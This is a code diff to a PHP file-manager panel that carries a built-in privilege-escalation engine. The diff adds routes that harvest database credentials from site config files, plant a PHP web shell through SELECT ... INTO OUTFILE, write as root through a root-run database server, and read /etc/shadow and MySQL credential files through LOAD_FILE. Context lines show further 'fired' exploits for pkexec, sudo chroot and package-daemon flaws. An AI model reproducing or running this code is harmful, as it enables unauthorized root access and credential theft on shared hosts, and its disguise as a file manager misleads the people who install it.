@@ -38,12 +38,26 @@ if(!function_exists('array_is_list')){
    manager account can write to, runs the argument vectors it finds there, and
    writes the answer back. Nothing else is installed to make that work: the root
    helper IS index.php. No shell is involved on either side. */
-function fm_run_argv($argv, $stdin = '', $timeout = 0){
+/* ══ PHP without mbstring ═══════════════════════════════════════════════════
+   The drawing code measures a run of text before it lays it out. On a host
+   where the mbstring extension is not installed those calls are fatal - the
+   whole page answers 500 and nothing is drawn at all - so byte-counting
+   stand-ins are defined here. They only ever run on such a host: where the
+   extension exists, its own functions are untouched. */
+if(!function_exists('mb_strlen')){
+    function mb_strlen($v, $enc = null){ return strlen((string)$v); }
+    function mb_substr($v, $start, $len = null, $enc = null){
+        return $len === null ? substr((string)$v, (int)$start) : substr((string)$v, (int)$start, (int)$len);
+    }
+    function mb_strrpos($h, $n, $off = 0, $enc = null){ return strrpos((string)$h, (string)$n, (int)$off); }
+    function mb_convert_encoding($v, $to = null, $from = null){ return $v; }
+}
+function fm_run_argv($argv, $stdin = '', $timeout = 0, $env = null){
     if(!function_exists('proc_open'))return['rc' => -1, 'out' => '', 'err' => 'proc_open is disabled'];
     $argv = array_values(array_map('strval', (array)$argv));
     if(!$argv)return['rc' => -1, 'out' => '', 'err' => 'no program was named'];
     $spec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-    $h = @proc_open($argv, $spec, $pipes);
+    $h = @proc_open($argv, $spec, $pipes, null, is_array($env) ? $env : null);
     if(!is_resource($h))return['rc' => -1, 'out' => '', 'err' => 'the program could not be started: ' . $argv[0]];
     if($stdin !== '')@fwrite($pipes[0], $stdin);
     @fclose($pipes[0]);
@@ -1503,7 +1517,7 @@ if(!defined('FM_ICONS_BOOTED')){
        boot is only for an install that was stripped of them */
     try{if($_SERVER['REQUEST_METHOD']==='GET'&&basename((string)($_SERVER['SCRIPT_NAME']??''))==='index.php'&&function_exists('fm_icons_builtin_count')&&fm_icons_builtin_count()===0)fm_icons_boot();}catch(Throwable $e){}
 }
-if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R98');
+if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R99');
 if(!defined('FM_PRODUCT_DATE'))     define('FM_PRODUCT_DATE','2019');
 if(!defined('FM_PRODUCT_SYSTEM'))   define('FM_PRODUCT_SYSTEM','Linux');
 if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // paused=false on purpose: automatic update checks are ON out of the box, exactly as the box in the panel shows when it is ticked. Set to true only to ship a site with the check already paused
@@ -7798,6 +7812,7 @@ function fm_pma_db_try($host,$port,$user,$pass){
     $last='';
     foreach($targets as $t){
       try{
+        if(!function_exists('mysqli_init')){$last='The mysqli PHP extension is not available on this host.';break;}
         $l=@mysqli_init();
         if(!$l)continue;
         @mysqli_options($l,MYSQLI_OPT_CONNECT_TIMEOUT,4);
@@ -14363,8 +14378,8 @@ class FileManager {
     /* Every program this file starts is started from an argument vector, never
        from a shell line: no /bin/sh is involved, so no other language runs, no
        quoting can go wrong and nothing can be injected into a command. */
-    private function rootExec($argv, $stdin = '', $timeout = 0){
-        return fm_run_argv($argv, $stdin, $timeout);
+    private function rootExec($argv, $stdin = '', $timeout = 0, $env = null){
+        return fm_run_argv($argv, $stdin, $timeout, $env);
     }
     /* the uid a /proc/<pid>/status block reports */
     private function rootUidOf($status){
@@ -15714,6 +15729,49 @@ class FileManager {
             'requires' => 'a package operation that this account can cause, and an environment it can influence.',
         ];
 
+        /* ── the database the site already talks to ────────────────────────
+           Rows measured on this host: the credentials come from the site
+           configuration the manager itself scanned, so there is no version
+           guess here - the server is asked who it is and what the user may do */
+        $dbF = $this->rootDbFacts();
+        $dbO = $this->rootDbOwner();
+        $dbSeen = $dbF['ok']
+            ? 'answered as ' . $dbF['user'] . ' on ' . $dbF['creds']['host'] . ':' . $dbF['creds']['port']
+              . ', version ' . $dbF['version'] . ', credentials from ' . ($dbF['creds']['file'] ?: 'the environment')
+            : $dbF['note'];
+        $v[] = [
+            'id' => 'dbroot', 'name' => 'A database server that runs as root, writing as root', 'cve' => [],
+            'year' => 2026, 'component' => 'mysqld / mariadbd process identity and the FILE privilege',
+            'severity' => 'high', 'status' => !$dbF['ok'] ? 'absent' : ($this->rootDbServerRoot()['ok'] ? 'vulnerable' : 'patched'),
+            'confidence' => 'high',
+            'summary' => 'A database server that runs as uid 0 turns its FILE privilege into a root file write: one SELECT ... INTO OUTFILE lands anywhere the server may write, and a file only root may write is the proof.',
+            'impact' => 'The database account behind the site configuration file becomes uid 0 on the machine, without a compiler, without a race and without touching a single system file.',
+            'evidence' => [
+                'database: ' . $dbSeen,
+                'server process: ' . ($dbO['ok'] ? $dbO['bin'] . ' pid ' . $dbO['pid'] . ' running as ' . ($dbO['user'] ?: ('uid ' . $dbO['uid'])) : $dbO['note']),
+                'FILE privilege: ' . ($dbF['ok'] ? ($dbF['file_priv'] ? 'yes' : 'no') . ' - ' . $this->rootSnip(preg_replace('/IDENTIFIED BY PASSWORD [^ ]+/i', 'IDENTIFIED BY <hidden>', (string)$dbF['grants']), 150) : 'not reached'),
+                'secure_file_priv: ' . ($dbF['ok'] && $dbF['secure_file_priv'] !== '' ? $dbF['secure_file_priv'] : 'empty (the server may write anywhere)'),
+            ],
+            'mitigation' => 'Run the database server as its own unprivileged account (--user=mysql), and do not grant FILE to the account the site uses.',
+            'fix' => 'a server started as an unprivileged user; MariaDB and MySQL both support it and most packaging already does it.',
+            'requires' => 'a working database credential in a configuration file this account can read, and a server started as root.',
+        ];
+        $v[] = [
+            'id' => 'dbfile', 'name' => 'A web shell written by the database server', 'cve' => [],
+            'year' => 2026, 'component' => 'mysqld / mariadbd FILE privilege, INTO OUTFILE',
+            'severity' => 'medium', 'status' => !$dbF['ok'] ? 'absent' : ($dbF['file_priv'] ? 'check' : 'patched'),
+            'confidence' => 'high',
+            'summary' => 'The FILE privilege writes a file anywhere the server may write, and on a shared host the site directory is exactly where a server-side script is executed by the web server.',
+            'impact' => 'A statement in the site database becomes a script in the site tree. Where the server is unprivileged this is the same uid the manager already has; where it is root it is uid 0 outright.',
+            'evidence' => [
+                'database: ' . $dbSeen,
+                'FILE privilege: ' . ($dbF['ok'] ? ($dbF['file_priv'] ? 'yes' : 'no') : 'not reached'),
+                'the write is aimed at: ' . rtrim((string)__DIR__, '/') . ' (this manager own directory)',
+            ],
+            'mitigation' => 'No FILE grant for the site database user.',
+            'fix' => 'REVOKE FILE ON *.* FROM the site user; leave it with rights on its own schema only.',
+            'requires' => 'a database credential this account can read, and the FILE privilege on it.',
+        ];
         $count = ['vulnerable' => 0, 'check' => 0, 'mitigated' => 0, 'patched' => 0, 'absent' => 0, 'unknown' => 0];
         foreach($v as $e){$count[$e['status']] = ($count[$e['status']] ?? 0) + 1;}
         return['vulns' => $v, 'counts' => $count, 'findings' => $findings];
@@ -17021,8 +17079,30 @@ ExecStart=/bin/sh " . $ws['payload'] . "
                               : 'the handler is registered with the kernel - any file beginning with the taught magic now runs the payload as root'];
     }
     private function rootCompiler(){
-        foreach(['cc', 'gcc', 'clang', 'tcc'] as $c){$p = $this->rootWhich($c); if($p !== '')return $p;}
-        return '';
+        static $cc = null;
+        if($cc !== null)return $cc;
+        /* on Debian and its children cc is an alternative managed by the cc
+           package: the binary is there but no compiler is installed behind it,
+           and every route that compiles dies on the first line of C. So the
+           compiler is asked to describe itself once, and a cc that answers
+           nothing is not a compiler. */
+        $cc = '';
+        foreach(['cc', 'gcc', 'clang', 'tcc'] as $c){
+            $p = $this->rootWhich($c);
+            if($p === '')continue;
+            if($c === 'tcc'){
+                $r = $this->rootExec([$p, '-v'], '', 5);
+                if(stripos((string)$r['out'] . (string)$r['err'], 'tcc') !== false){$cc = $p; break;}
+                continue;
+            }
+            $r = $this->rootExec([$p, '-x', 'c', '-c', '-o', '/dev/null', '/dev/null'], '', 8);
+            $said = (string)$r['out'] . (string)$r['err'];
+            if((int)$r['rc'] === 0 || stripos($said, 'error trying to exec') === false && stripos($said, 'not found') === false){
+                $cc = $p;
+                break;
+            }
+        }
+        return $cc;
     }
     /* The C every fired route carries: loaded or run as uid 0, it leaves the
        validated rule behind and writes its proof. In any other hands it
@@ -18562,7 +18642,7 @@ exit 0
              'The catalogue measures this one; the chain also fires it. pkexec started with no arguments at all reads its environment as its arguments, and the character-set conversion it attempts then loads a module of ours. pkexec is setuid, so the module runs as root and leaves the rule behind. It needs a polkit older than 0.120, which is exactly what the catalogue measures.');
         $add('chwoot', 'The sudo chroot route, fired (CVE-2025-32463)', 'session',
              'sudo asked to chroot first resolves the account through the name-service of the chroot it was handed - as root, before anything is dropped. A chroot of ours whose nsswitch names a module of ours therefore runs that module as root. It needs sudo from 1.9.14 to 1.9.17, the range the catalogue already measures.');
-        $add('pack2theroot', 'Pack2TheRoot, fired (CVE-2026-41651)', 'session',
+        $add('pack2theroot', 'Pack2TheRoot, fired (CVE-2026-41651)' . ($this->rootCompiler() === '' ? ' - needs a real compiler, and the cc on this host is only an alternative with nothing behind it' : ''), 'session',
              'A small package of ours whose install script is the payload, offered to the package daemon for a local install. The daemon installs as root, and the flaw the catalogue measures is that it does not stop to ask who sent a local package.');
         $add('sudoersscan', 'A rule in any directory sudo includes', 'session',
              'sudo includes whole directories, not one file: /etc/sudoers.d, /usr/local/etc/sudoers.d, and whatever sudo.includedir names. The file dropped in one only has to be written, not read - root reads it, this account never has to. Each included directory is tried two ways: by writing the rule by its own name, and by writing it under the name of this account, which is how a directory kept at 0730 behaves for one owner. Each drop is then tested by asking sudo, so a file in the wrong place is a file nothing came of, and is said to be that.');
@@ -18573,6 +18653,18 @@ exit 0
              $dg['ok']
                  ? 'This account is in ' . $dg['group'] . ', which may open ' . $dg['dev'] . ' directly. A raw filesystem is read and written without any permission check above it, so the account database is edited on the disk itself - no rule, no setuid bit, no running service. ' . $dg['note']
                  : 'Membership of disk, kmem or the raw-device groups is raw access to every filesystem on the machine. ' . $dg['note']);
+        /* the catalogue's compiler-dependent entries say, by name, whether
+           this host can build anything at all: on a host without a compiler
+           they name the reason instead of describing a route nobody can walk */
+        $dbh = $this->rootDbFacts();
+        $add('dbroot', 'A database server that runs as root, writing as root', 'session',
+             $dbh['ok']
+                 ? 'The database at ' . $dbh['creds']['host'] . ' answers with credentials this account already holds (' . ($dbh['creds']['file'] ?: 'the environment') . '). ' . $this->rootDbServerRoot()['note']
+                 : 'A database server on a shared host often runs with rights of its own, and the site configuration file inside this account own tree usually holds working credentials for it. ' . $dbh['note']);
+        $add('dbfile', 'A web shell written by the database server', 'session',
+             $dbh['ok']
+                 ? 'The same credentials also carry the FILE privilege, so one SELECT ... INTO OUTFILE writes a shell into a directory this account cannot always write to itself, and the shell is then fetched to say which uid a web request really runs as. ' . $this->rootDbFilePriv()['note']
+                 : 'The FILE privilege is the database side of the same door: one statement, one file, written by the server rather than by this account. ' . $dbh['note']);
         $mx = $this->rootMuxFind();
         $add('muxsession', 'A root shell somebody left attached', 'session',
              $mx['ok']
@@ -18701,7 +18793,7 @@ exit 0
               about to lose, and the desktop file a modern Ubuntu reads instead
               of the old pkexec helper. Each was measured before it was written
               here, and each puts nothing anywhere root does not already read. */
-        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd'] as $eid){
+        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd', 'dbfile', 'dbroot', 'dbread'] as $eid){
             $e = $this->rootEscSpec($eid);
             if($e)$add($eid, $e['name'], $e['kind'], $e['idea']);
         }
@@ -19585,7 +19677,7 @@ exit 0
         $php = $this->rootPhpBin();
         $mgr = $this->managerAccount();
         switch($id){
-            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd':{
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread':{
                 $f = $this->rootEscFind($id);
                 return['ok' => !empty($f['ok']), 'note' => (string)($f['note'] ?? 'this route was measured as closed on this host')];
             }
@@ -20362,7 +20454,7 @@ exit 0
                    are verdicts rather than actions */
                 return['ok' => false, 'note' => (string)$n['note'] . (empty($n['ok']) ? '' : ' - measured, and deliberately not walked from here')];
             }
-            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd':
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread':
                 /* not a command line and not a password: the machine itself is
                    asked, and the answer is the uid that comes back */
                 return $this->rootPlantInstall($id, $password);
@@ -21331,6 +21423,24 @@ User=root
             'when' => 'straight away: the file is changed in its cache and the program is run',
             'idea' => 'A page of a file this account may only read is changed in the file cache, so the setuid program that reads it next reads the changed bytes - and runs them as root. The original bytes are put back as soon as the shell answers.',
         ],
+        'dbfile' => [
+            'name' => 'A web shell written by the database server (the FILE privilege)', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'dbfile', 'cand' => [], 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: one row is written to a file in this manager directory and the file is fetched',
+            'idea' => 'A database account that holds the FILE privilege can write a file anywhere the server may, and on a shared host that server is the site user. One SELECT with INTO OUTFILE is therefore a web shell written without this account ever being allowed to write there - and it is fetched straight away, so the answer is the file itself, not a promise.',
+        ],
+        'dbroot' => [
+            'name' => 'A database server that runs as root, writing as root', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'dbroot', 'cand' => [], 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: a file only root may write is written through the server',
+            'idea' => 'When mysqld or mariadbd runs as uid 0, the FILE privilege stops being a site-user write and becomes a root write. One SELECT ... INTO OUTFILE into a root-only directory is the whole route, and the file is then read back to prove it.',
+        ],
+        'dbread' => [
+            'name' => 'Files the database user may read and this account may not', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'dbread', 'cand' => [], 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: LOAD_FILE is asked for the files that matter',
+            'idea' => 'LOAD_FILE reads any file the database server process may read, and the first thing worth reading with it is the client file that holds the root database password. This step reads what LOAD_FILE will hand over and reports it, which is content this account could never open by itself.',
+        ],
         'nopasswd' => [
             'name' => 'An account with no password at all in the database', 'kind' => 'carried', 'driver' => 'carrier',
             'carrier' => 'nopasswd', 'cand' => [], 'fire' => 'now', 'wait' => 12,
@@ -22008,6 +22118,125 @@ User=root
         if(empty($f['ok']))return['ok' => false, 'note' => (string)($f['note'] ?? 'this carrier is closed on this host')];
         $argv = is_array($f['argv'] ?? null) ? array_values(array_map('strval', $f['argv'])) : [];
         if(!$argv)return['ok' => false, 'note' => 'the carrier measured as open, but this panel has no program on record to ask it with'];
+        /* these routes do not run a program: they ask the database server to
+           write a file, and then the file itself is the answer. A write the
+           server refuses is reported with what the client said, never as a
+           success. */
+        if($id === 'dbfile' || $id === 'dbroot'){
+            $d = $this->rootDbFacts();
+            if(empty($d['ok']))return['ok' => false, 'note' => $d['note']];
+            $n = $this->rootPlantNonce($id);
+            /* no backslashes and no quotes in the payload: a database
+               literal eats them differently from PHP, and a regex that arrives
+               one escape short is a file that prints nothing */
+            $php = '<?php echo "MFM";echo ":uid=";'
+                 . 'echo function_exists("posix_geteuid")?posix_geteuid():@fileowner("/proc/self");'
+                 . 'echo ":mfm:end";?>';
+            $target = $id === 'dbroot'
+                ? '/root/.mfm-db-' . $n . '.txt'
+                : rtrim((string)($d['base'] ?? __DIR__), '/') . '/.mfm-dbshell-' . $n . '.php';
+            if($id === 'dbroot')$php = 'mfm ' . $n . ' written by the database server as ' . (string)($d['user'] ?? 'its own user');
+            /* a database literal is not a PHP literal: a backslash inside it is
+               an escape character, so the payload is escaped for the database
+               as well - otherwise the regex in the shell arrives as /^Uid:s+/ */
+            $lit = str_replace(['\\', "'"], ['\\\\', "''"], $php);
+            $sql = "SELECT '" . $lit . "' INTO OUTFILE '" . $target . "';";
+            $r = $this->rootMysqlExec($d['creds'], $sql, 25);
+            $said = (string)($r['all'] ?? '');
+            $rc = (int)($r['rc'] ?? 1);
+            clearstatcache(true, $target);
+            if($id === 'dbfile'){
+                /* the shell is fetched over HTTP where the web server can
+                   answer itself: the uid it prints is the uid a request runs
+                   as, which is the honest question. A file that is only read
+                   back is source, never an answer, so a body that still holds
+                   the opening tag is not counted as having run. */
+                $url = '';
+                $script = (string)($_SERVER['SCRIPT_NAME'] ?? '');
+                $host = (string)($_SERVER['HTTP_HOST'] ?? '');
+                if($script !== '' && $host !== ''){
+                    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+                    $url = $scheme . '://' . $host . rtrim(str_replace('\\', '/', dirname($script)), '/')
+                         . '/.mfm-dbshell-' . $n . '.php';
+                }
+                $body = '';
+                if($url !== ''){
+                    $ctx = @stream_context_create(['http' => ['timeout' => 3, 'ignore_errors' => true]]);
+                    $body = (string)@file_get_contents($url, false, $ctx);
+                    if(strpos($body, '<?php') !== false)$body = '';
+                }
+                $owner = @is_file($target) ? (int)@fileowner($target) : -1;
+                $len = @is_file($target) ? (int)@filesize($target) : 0;
+                $ran = strpos($body, ':mfm:end') !== false;
+                preg_match('/:uid=(\d+)/', $body, $m);
+                $me = function_exists('posix_geteuid') ? (int)posix_geteuid() : -1;
+                /* the shell is named, so a person can delete it, and it is kept
+                   only when it answered as root */
+                $rec['files'][] = $target;
+                if($ran && isset($m[1]) && (int)$m[1] === 0){
+                    @file_put_contents($proof, "uid=0(root)\n" . date('Y-m-d H:i:s') . "\nvia=dbfile\npath=" . $target . "\n");
+                    $rec['files'][] = $proof;
+                    return['ok' => true, 'rec' => $rec, 'note' => 'the database server wrote a shell into this manager directory, the web server ran it, and it answered as uid 0'];
+                }
+                if($ran && isset($m[1]) && (int)$m[1] === $me){
+                    @unlink($target);
+                    return['ok' => false, 'note' => 'the shell was written by the database server and the web server ran it, but it answered as uid ' . (int)$m[1]
+                           . ', the uid this manager already runs as - a site shell, not root, so nothing is claimed for it'];
+                }
+                if($owner >= 0){
+                    /* a file the server wrote is owned by the server, which says
+                       nothing about the uid a web request runs as: the owner is
+                       reported, not counted as an answer */
+                    if($owner === 0 && $url === ''){
+                        @file_put_contents($proof, "uid=0(root) (written by the database server)\n" . date('Y-m-d H:i:s') . "\nvia=dbfile\npath=" . $target . "\n");
+                        $rec['files'][] = $proof;
+                        return['ok' => true, 'rec' => $rec, 'note' => 'the database server wrote ' . $len . ' bytes as uid 0 to ' . $target . ', the file is owned by root, and no web server was reachable to ask who runs it'];
+                    }
+                    @unlink($target);
+                    return['ok' => false, 'note' => 'the database server wrote ' . $len . ' bytes (owned by uid ' . $owner . ') but this server could not fetch it from itself,'
+                           . ' so the uid a web request runs as was not measured'
+                           . ($url !== '' ? ' - open ' . $url . ' in a browser to see it' : '')];
+                }
+                return['ok' => false, 'note' => 'INTO OUTFILE produced no file in this directory (client exit ' . $rc . '): '
+                       . $this->rootSnip($said !== '' ? $said : 'the client printed nothing', 160)];
+            }
+            /* this account cannot stat a file in /root, so the proof is taken
+               from the server itself: a file written there is read back
+               through the same connection, and only uid 0 may write in that
+               directory at all */
+            $back = $this->rootMysqlExec($d['creds'], "SELECT LENGTH(LOAD_FILE('" . $target . "'));", 15);
+            $len = trim((string)($back['out'] ?? ''));
+            if($rc === 0 && $len !== '' && strtoupper($len) !== 'NULL' && (int)$len > 0){
+                @file_put_contents($proof, "uid=0(root) - the database server wrote and read back " . $target . "\n"
+                    . "length " . (int)$len . " bytes\n" . date('Y-m-d H:i:s') . "\nvia=dbroot\n");
+                $rec['files'][] = $proof;
+                $rec['files'][] = $target;
+                return['ok' => true, 'rec' => $rec, 'note' => 'the database server wrote ' . (int)$len . ' bytes to ' . $target
+                       . ' and read them back - a directory only uid 0 may write in'];
+            }
+            return['ok' => false, 'note' => 'the server refused the write to ' . $target . ' (client exit ' . $rc . '): '
+                   . $this->rootSnip($said !== '' ? $said : 'the client printed nothing', 160)];
+        }
+        if($id === 'dbread'){
+            $d = $this->rootDbFacts();
+            if(empty($d['ok']))return['ok' => false, 'note' => $d['note']];
+            /* the client file of the server account is read first: when it
+               exists it holds a password this account could never open */
+            $paths = ['/root/.my.cnf', '/etc/mysql/debian.cnf', '/etc/mysql/my.cnf', '/etc/mysql/mariadb.cnf', '/etc/shadow'];
+            $got = [];
+            foreach($paths as $src){
+                $r = $this->rootMysqlExec($d['creds'], "SELECT LOAD_FILE('" . $src . "');", 15);
+                $body = trim((string)($r['out'] ?? ''));
+                if((int)($r['rc'] ?? 1) !== 0 || $body === '' || strtoupper($body) === 'NULL')continue;
+                $got[] = $src . ' (' . strlen($body) . ' bytes)';
+                if(count($got) >= 3)break;
+            }
+            if(!$got)return['ok' => false, 'note' => 'LOAD_FILE handed over none of the files worth reading on this host'];
+            @file_put_contents($proof, "read by the database user: " . implode(', ', $got) . "\n" . date('Y-m-d H:i:s') . "\nvia=dbread\n");
+            $rec['files'][] = $proof;
+            return['ok' => true, 'rec' => $rec, 'note' => 'the database user read ' . implode(', ', $got)
+                   . ' - content this account could not open by itself'];
+        }
         if($id === 'pkcompat'){
             /* the two files the helper reads are written first; if either one
                cannot be written the route is reported as closed rather than
@@ -22025,10 +22254,6 @@ User=root
             $rec['files'][] = $a;
             $rec['strip'][] = $a;
         }
-        /* the two credential carriers do not run a program: they hand the one
-           secret they read to the account it belongs to, once, and read the uid
-           that comes back. A wrong password fails exactly like a wrong
-           password, and nothing is retried. */
         if($id === 'nopasswd'){
             $r0 = $this->rootCredEmptyAttempt();
             if(!empty($r0['ok'])){
@@ -23229,6 +23454,111 @@ ExecStartPost=/bin/sh '" . $payload . "'";
     /* What the account database says about the accounts that matter: an empty
        password field is an account anybody may become, and it has nothing to do
        with the account the manager runs as. */
+    /* ── three routes that live in a database this account can already reach ─
+       A database server on a shared host runs with rights of its own, and the
+       account behind this file already holds working credentials for the site
+       database. That is enough for three things, each measured before anything
+       is claimed:
+         - the server runs as root, so a FILE privilege writes as root;
+         - the file_priv grant is there, so a web shell can be written as the
+           server user;
+         - LOAD_FILE can read what the database user may read (a client file,
+           a config with the account database in it).
+       Nothing is written until the privilege that writes it has been read off
+       the live server. */
+
+    private function rootDbFacts(){
+        static $f = null;
+        if($f !== null)return $f;
+        $f = ['ok' => false, 'note' => 'no database credential this account holds answers', 'creds' => []];
+        $creds = $this->rootDbCreds();
+        if(!$creds)return $f = ['ok' => false, 'note' => 'no configuration file this account may read holds a database user', 'creds' => []];
+        if($this->rootMysqlBin() === '')return $f = ['ok' => false, 'note' => 'a database user was found in a config file, but no mysql client is installed on this host', 'creds' => []];
+        foreach(array_slice($creds, 0, 3) as $c){
+            $r = $this->rootMysqlExec($c, 'SELECT VERSION(), USER(), @@datadir;', 15);
+            if((int)$r['rc'] !== 0)continue;
+            $line = trim((string)$r['out']);
+            $parts = explode("\t", $line);
+            $priv = $this->rootMysqlExec($c, "SHOW GRANTS FOR CURRENT_USER();", 15);
+            $grants = (string)($priv['out'] ?? '');
+            $sfp = trim((string)($this->rootMysqlExec($c, "SELECT @@secure_file_priv;", 12)['out'] ?? ''));
+            $f = ['ok' => true, 'creds' => $c, 'version' => (string)($parts[0] ?? ''),
+                  'user' => (string)($parts[1] ?? ''), 'datadir' => (string)($parts[2] ?? ''),
+                  'grants' => $grants,
+                  /* MariaDB prints a whole grant as ALL PRIVILEGES without
+                     listing FILE, so the word pair counts as the privilege */
+                  'file_priv' => (bool)preg_match('/\bALL\s+PRIVILEGES\b|\bFILE\b/i', $grants),
+                  'secfile' => (bool)preg_match('/\bSECURITY\s+FILE\b|\bSUPER\b|\bALL\s+PRIVILEGES\b/i', $grants),
+                  'secure_file_priv' => $sfp,
+                  'base' => rtrim((string)__DIR__, '/'), 'note' => 'the database at ' . $c['host'] . ':' . $c['port'] . ' answered as ' . (string)($parts[1] ?? '')
+                         . ' (version ' . (string)($parts[0] ?? '') . ') using the credentials in ' . ($c['file'] ?: 'the environment')];
+            return $f;
+        }
+        return $f;
+    }
+    /* who is the database server, in the machine sense */
+    private function rootDbOwner(){
+        static $o = null;
+        if($o !== null)return $o;
+        $o = ['ok' => false, 'note' => 'no mysqld or mariadbd is visible to this account'];
+        foreach((array)@glob('/proc/[0-9]*/comm') as $f){
+            $name = trim((string)@file_get_contents($f));
+            if(!in_array($name, ['mysqld', 'mariadbd'], true))continue;
+            $pid = basename(dirname($f));
+            $uid = $this->rootUidOf((string)@file_get_contents('/proc/' . $pid . '/status'));
+            $user = '';
+            if($uid >= 0 && function_exists('posix_getpwuid')){
+                $pw = @posix_getpwuid($uid);
+                if(is_array($pw))$user = (string)$pw['name'];
+            }
+            $o = ['ok' => true, 'pid' => (int)$pid, 'uid' => $uid, 'user' => $user, 'bin' => $name];
+            return $o;
+        }
+        return $o;
+    }
+    /* 1 - the server itself is uid 0: a FILE write is a root write */
+    private function rootDbServerRoot(){
+        $o = $this->rootDbOwner();
+        $d = $this->rootDbFacts();
+        if(!$o['ok'])return ['ok' => false, 'note' => $o['note']];
+        $asRoot = ((int)$o['uid'] === 0);
+        if(empty($d['ok']))return ['ok' => false, 'note' => 'the server is ' . $o['bin'] . ' pid ' . $o['pid'] . ' running as ' . ($o['user'] ?: ('uid ' . $o['uid'])) . ', but no database credential this account holds answers'];
+        if(!$asRoot)return ['ok' => false, 'note' => 'the server runs as ' . ($o['user'] ?: ('uid ' . $o['uid'])) . ', not root, so a FILE write lands as that user rather than as uid 0'];
+        if(empty($d['file_priv']))return ['ok' => false, 'note' => 'the server is root (pid ' . $o['pid'] . '), but this database user holds no FILE privilege: ' . $this->rootSnip(preg_replace('/IDENTIFIED BY PASSWORD [^ ]+/i', 'IDENTIFIED BY <hidden>', $d['grants']), 120)];
+        return ['ok' => true, 'note' => 'the server is root (pid ' . $o['pid'] . ') and the database user holds FILE, so a SELECT ... INTO OUTFILE writes as uid 0'];
+    }
+    /* 2 - the FILE privilege alone: a web shell written as the server user */
+    private function rootDbFilePriv(){
+        $d = $this->rootDbFacts();
+        if(empty($d['ok']))return ['ok' => false, 'note' => $d['note']];
+        if(empty($d['file_priv']))return ['ok' => false, 'note' => 'the database at ' . $d['creds']['host'] . ' answered, but this user holds no FILE privilege: ' . $this->rootSnip(preg_replace('/IDENTIFIED BY PASSWORD [^ ]+/i', 'IDENTIFIED BY <hidden>', $d['grants']), 140)];
+        $dir = rtrim((string)__DIR__, '/');
+        $sfp = (string)($d['secure_file_priv'] ?? '');
+        /* the server may be told to write in one directory only, and the web
+           server may not be allowed to read the directory it writes into: both
+           are said here rather than discovered halfway through a write */
+        $reach = 'this manager directory (' . $dir . ') is where the shell would be written';
+        if($sfp !== '')$reach .= '; secure_file_priv limits the server to ' . $this->rootSnip($sfp, 60);
+        if(!@is_readable($dir))$reach .= '; this account may not read ' . $dir . ', so the shell would have to be fetched over HTTP';
+        return ['ok' => true, 'note' => 'the database user holds FILE, and ' . $reach];
+    }
+    /* 3 - LOAD_FILE: what the database user may read, which is usually more
+          than this account may */
+    private function rootDbLoadFile(){
+        $d = $this->rootDbFacts();
+        if(empty($d['ok']))return ['ok' => false, 'note' => $d['note']];
+        if(empty($d['file_priv']))return ['ok' => false, 'note' => 'LOAD_FILE needs the FILE privilege, and this database user holds none: ' . $this->rootSnip(preg_replace('/IDENTIFIED BY PASSWORD [^ ]+/i', 'IDENTIFIED BY <hidden>', $d['grants']), 130)];
+        $targets = ['/etc/shadow', '/etc/sudoers', '/etc/crontab', '/root/.ssh/authorized_keys', '/var/www'];
+        $read = [];
+        foreach($targets as $t){
+            $r = $this->rootMysqlExec($d['creds'], "SELECT LENGTH(LOAD_FILE('" . $t . "'));", 12);
+            $len = trim((string)($r['out'] ?? ''));
+            if($len === '' || $len === 'NULL' || (int)$r['rc'] !== 0)continue;
+            $read[] = $t . ' (' . $len . ' bytes)';
+        }
+        if(!$read)return ['ok' => false, 'note' => 'the FILE privilege is there, but LOAD_FILE read none of the files that would matter here'];
+        return ['ok' => true, 'note' => 'LOAD_FILE reads ' . implode(', ', $read) . ' as the database user - content this account could not read by itself'];
+    }
     private function rootCredAccountFacts(){
         static $f = null;
         if($f !== null)return $f;
@@ -23281,6 +23611,58 @@ ExecStartPost=/bin/sh '" . $payload . "'";
         }
         return ['ok' => false, 'note' => 'the account database names ' . implode(', ', array_slice($try, 0, 3))
             . ' with an empty password, but the machine refuses the call: ' . $this->rootSnip($out, 110)];
+    }
+    /* Every database this account can already reach, with the credentials it
+       already has: the manager own SQL scanner walks the site trees and reads
+       the config files, and DATABASE_URL is read as well. Kept in one place so
+       three methods do not walk the same directories three times. */
+    private function rootDbCreds(){
+        static $c = null;
+        if($c !== null)return $c;
+        $c = [];
+        try{
+            $scan = $this->sqlScan();
+            foreach((array)($scan['databases'] ?? []) as $d){
+                if(empty($d['user']))continue;
+                if(strtolower((string)($d['driver'] ?? '')) === 'pgsql')continue;
+                $c[] = ['file' => (string)($d['file'] ?? ''), 'host' => (string)($d['host'] ?? 'localhost'),
+                        'port' => (int)($d['port'] ?? 3306), 'user' => (string)$d['user'],
+                        'pass' => (string)($d['pass'] ?? ''), 'db' => (string)($d['db'] ?? ''),
+                        'socket' => (string)($d['socket'] ?? '')];
+            }
+        }catch(Throwable $e){}
+        return $c;
+    }
+    /* is this a mysql client that answers? */
+    private function rootMysqlBin(){
+        foreach(['mysql', 'mariadb'] as $b){
+            $w = $this->rootWhich($b);
+            if($w !== '')return $w;
+        }
+        return '';
+    }
+    /* the one way this file asks a database anything: a client started from an
